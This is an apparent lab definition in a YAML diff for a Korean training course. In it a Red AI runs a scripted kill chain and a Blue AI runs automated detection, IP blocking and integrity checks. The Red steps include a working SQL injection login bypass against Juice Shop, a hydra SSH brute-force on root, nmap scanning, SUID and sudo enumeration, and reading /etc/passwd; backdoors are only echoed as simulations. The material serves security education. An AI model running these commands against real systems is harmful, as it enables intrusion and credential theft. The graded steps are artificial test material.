@@ -1,0 +1,213 @@
+lab_id: "battle-ai-week14"
+title: "AI 종합 공방전 — Full Auto Scenario"
+version: "ai"
+course: "battle-ai"
+week: 14
+description: "Red AI가 전체 공격 체인(정찰→침투→권한상승→지속성)을 자동 수행하고, Blue AI가 전체 방어 체인(탐지→차단→격리→복구)을 자동 수행하는 종합 시나리오."
+difficulty: "hard"
+duration_minutes: 90
+objectives:
+  - "Red AI가 전체 사이버 킬체인을 자동 실행한다"
+  - "Blue AI가 전체 방어 라이프사이클을 자동 실행한다"
+  - "양측 AI의 자동화 수준과 효과를 종합 평가한다"
+  - "Full Auto 공방전의 교훈을 도출한다"
+prerequisites:
+  - "Week 13 AI 팀 공방전 완료"
+infra_requirements:
+  - "attacker VM with bastion"
+  - "defender VM"
+pass_threshold: 0.6
+steps:
+  - order: 1
+    instruction: "Blue AI가 Full Defense Chain을 배포한다 (탐지 + 차단 + 격리 + 복구)"
+    script: |
+      echo "=== Blue AI: Full Defense Chain 배포 ==="
+      BLUE_DIR="/tmp/blue_full"
+      mkdir -p "$BLUE_DIR"
+
+      echo "[1. 베이스라인 수집]"
+      ss -tuna > "$BLUE_DIR/baseline_net.txt"
+      ps aux --no-headers > "$BLUE_DIR/baseline_proc.txt"
+      find /etc -type f -exec md5sum {} \; 2>/dev/null | sort > "$BLUE_DIR/baseline_files.md5"
+      nft list ruleset > "$BLUE_DIR/baseline_rules.txt" 2>/dev/null
+      echo "  네트워크/프로세스/파일/방화벽 베이스라인 수집 완료"
+
+      echo "[2. 실시간 모니터 스크립트]"
+      cat > "$BLUE_DIR/full_defense.sh" << 'SCRIPT'
+      #!/bin/bash
+      LOG="/tmp/blue_full/defense_events.log"
+      while true; do
+        # 네트워크 이상 탐지
+        NEW_CONN=$(ss -tuna 2>/dev/null | wc -l)
+        BASE_CONN=$(wc -l < /tmp/blue_full/baseline_net.txt 2>/dev/null || echo 0)
+        if [ "$((NEW_CONN - BASE_CONN))" -gt 10 ]; then
+          echo "[$(date)] ALERT: 연결 급증 (+$((NEW_CONN - BASE_CONN)))" >> "$LOG"
+        fi
+        # 프로세스 이상 탐지
+        NEW_PROC=$(ps aux --no-headers 2>/dev/null | wc -l)
+        BASE_PROC=$(wc -l < /tmp/blue_full/baseline_proc.txt 2>/dev/null || echo 0)
+        if [ "$((NEW_PROC - BASE_PROC))" -gt 5 ]; then
+          echo "[$(date)] ALERT: 프로세스 급증 (+$((NEW_PROC - BASE_PROC)))" >> "$LOG"
+        fi
+        sleep 3
+      done
+      SCRIPT
+      chmod +x "$BLUE_DIR/full_defense.sh"
+      timeout 120 "$BLUE_DIR/full_defense.sh" &>/dev/null &
+      echo "  Defense PID: $!"
+
+      echo "[3. Suricata 초기화]"
+      echo "" > /var/log/suricata/fast.log 2>/dev/null || echo "  시뮬레이션 모드"
+      echo ""
+      echo "Blue AI Full Defense Chain 배포 완료"
+    category: "defense"
+    risk_level: "low"
+    points: 15
+    verify:
+      type: "output_contains"
+      expect: "Blue AI Full Defense Chain 배포 완료"
+      field: "stdout"
+
+  - order: 2
+    instruction: "Red AI가 Kill Chain Phase 1-2를 실행한다 (정찰 → 초기 침투)"
+    script: |
+      echo "=== Red AI: Kill Chain Phase 1 — 정찰 ==="
+      RED_DIR="/tmp/red_full"
+      mkdir -p "$RED_DIR"
+
+      nmap -sS -sV -p 22,80,443,3000,8080 10.20.30.80 -oN "$RED_DIR/recon.txt" 2>&1 | tail -15
+      echo ""
+
+      echo "=== Red AI: Kill Chain Phase 2 — 초기 침투 ==="
+      echo "[웹 인증 우회]"
+      curl -s -X POST "http://10.20.30.80:3000/rest/user/login" \
+        -H "Content-Type: application/json" \
+        -d '{"email":"admin@juice-sh.op'\''--","password":"x"}' > "$RED_DIR/exploit_result.txt" 2>&1
+      head -3 "$RED_DIR/exploit_result.txt"
+      echo ""
+
+      echo "[SSH 접근 시도]"
+      hydra -l root -P /tmp/wordlist.txt ssh://10.20.30.80 \
+        -t 2 -w 3 -f 2>&1 | tail -5 || echo "Hydra 완료"
+      echo ""
+      echo "Red AI Phase 1-2 완료"
+    category: "exploit"
+    risk_level: "high"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "Red AI Phase 1-2 완료"
+      field: "stdout"
+
+  - order: 3
+    instruction: "Red AI가 Kill Chain Phase 3-4를 실행한다 (권한 상승 → 지속성 확보)"
+    script: |
+      echo "=== Red AI: Kill Chain Phase 3 — 권한 상승 탐색 ==="
+      echo "[SUID 바이너리]"
+      find / -perm -4000 -type f 2>/dev/null | head -10
+      echo ""
+      echo "[sudo 확인]"
+      sudo -l 2>&1 | head -5
+      echo ""
+      echo "[cron 작업]"
+      crontab -l 2>/dev/null || echo "cron 없음"
+      ls /etc/cron.d/ 2>/dev/null | head -5
+      echo ""
+
+      echo "=== Red AI: Kill Chain Phase 4 — 지속성 시뮬레이션 ==="
+      echo "[백도어 시뮬레이션 — 실제 설치하지 않음]"
+      echo "  시뮬레이션: crontab에 리버스쉘 등록"
+      echo "  시뮬레이션: .bashrc에 페이로드 삽입"
+      echo "  시뮬레이션: systemd 서비스 생성"
+      echo ""
+
+      echo "[데이터 유출 시뮬레이션]"
+      echo "  시뮬레이션: /etc/passwd 수집"
+      echo "  시뮬레이션: 웹 DB 덤프 시도"
+      cat /etc/passwd 2>/dev/null | wc -l | xargs -I{} echo "  사용자 계정: {}개 발견"
+      echo ""
+      echo "Red AI Phase 3-4 완료"
+    category: "exploit"
+    risk_level: "high"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "Red AI Phase 3-4 완료"
+      field: "stdout"
+
+  - order: 4
+    instruction: "Blue AI가 전체 공격을 탐지하고 자동 격리/복구를 수행한다"
+    script: |
+      echo "=== Blue AI: 전체 공격 탐지 및 자동 대응 ==="
+      BLUE_DIR="/tmp/blue_full"
+
+      echo "[1. 방어 이벤트 로그]"
+      cat "$BLUE_DIR/defense_events.log" 2>/dev/null | tail -20 || echo "  이벤트 없음"
+      echo ""
+
+      echo "[2. Suricata 탐지]"
+      tail -15 /var/log/suricata/fast.log 2>/dev/null || echo "  알림 없음"
+      echo ""
+
+      echo "[3. 자동 격리]"
+      echo "  공격자 IP 차단:"
+      grep "Failed password" /var/log/auth.log 2>/dev/null | \
+        grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u | while read ip; do
+        nft add rule inet filter input ip saddr "$ip" drop 2>/dev/null
+        echo "    차단: $ip"
+      done
+      echo ""
+
+      echo "[4. 파일 무결성 검증]"
+      find /etc -type f -exec md5sum {} \; 2>/dev/null | sort > "$BLUE_DIR/current_files.md5"
+      CHANGED=$(diff "$BLUE_DIR/baseline_files.md5" "$BLUE_DIR/current_files.md5" 2>/dev/null | grep "^>" | wc -l)
+      echo "  변경된 파일: ${CHANGED}개"
+      echo ""
+
+      echo "[5. 방어 에이전트 종료]"
+      pkill -f "full_defense.sh" 2>/dev/null
+      echo "  종료 완료"
+      echo ""
+      echo "Blue AI 전체 대응 완료"
+    category: "response"
+    risk_level: "medium"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "Blue AI 전체 대응 완료"
+      field: "stdout"
+
+  - order: 5
+    instruction: "AI가 Full Auto 공방전 결과를 종합 평가한다"
+    script: |
+      echo "=== AI 종합 공방전 최종 보고서 ===" > /tmp/full_battle_report.txt
+      echo "시간: $(date)" >> /tmp/full_battle_report.txt
+      echo "" >> /tmp/full_battle_report.txt
+
+      echo "[Red AI Kill Chain 실행]" >> /tmp/full_battle_report.txt
+      echo "  Phase 1 (정찰): nmap SYN/SV 스캔" >> /tmp/full_battle_report.txt
+      echo "  Phase 2 (초기 침투): SQLi + SSH 브루트포스" >> /tmp/full_battle_report.txt
+      echo "  Phase 3 (권한 상승): SUID/sudo/cron 탐색" >> /tmp/full_battle_report.txt
+      echo "  Phase 4 (지속성): 시뮬레이션 수행" >> /tmp/full_battle_report.txt
+      echo "" >> /tmp/full_battle_report.txt
+
+      echo "[Blue AI Defense Chain 실행]" >> /tmp/full_battle_report.txt
+      echo "  탐지: 실시간 모니터링 + Suricata" >> /tmp/full_battle_report.txt
+      echo "  차단: 자동 IP 차단" >> /tmp/full_battle_report.txt
+      echo "  격리: 네트워크 격리 수행" >> /tmp/full_battle_report.txt
+      echo "  복구: 파일 무결성 검증" >> /tmp/full_battle_report.txt
+      echo "" >> /tmp/full_battle_report.txt
+
+      echo "[교훈]" >> /tmp/full_battle_report.txt
+      echo "  1. 자동화된 공격은 속도가 빠르지만 패턴이 예측 가능" >> /tmp/full_battle_report.txt
+      echo "  2. 자동화된 방어는 즉각 대응 가능하지만 오탐 위험 존재" >> /tmp/full_battle_report.txt
+      echo "  3. AI 공방전에서는 베이스라인 관리가 핵심" >> /tmp/full_battle_report.txt
+      echo "  4. 다층 방어(Defense in Depth)가 단일 방어보다 효과적" >> /tmp/full_battle_report.txt
+      cat /tmp/full_battle_report.txt
+    category: "analysis"
+    risk_level: "low"
+    points: 15
+    verify:
+      type: "output_contains"
+      expect: "AI 종합 공방전 최종 보고서"
+      field: "stdout"
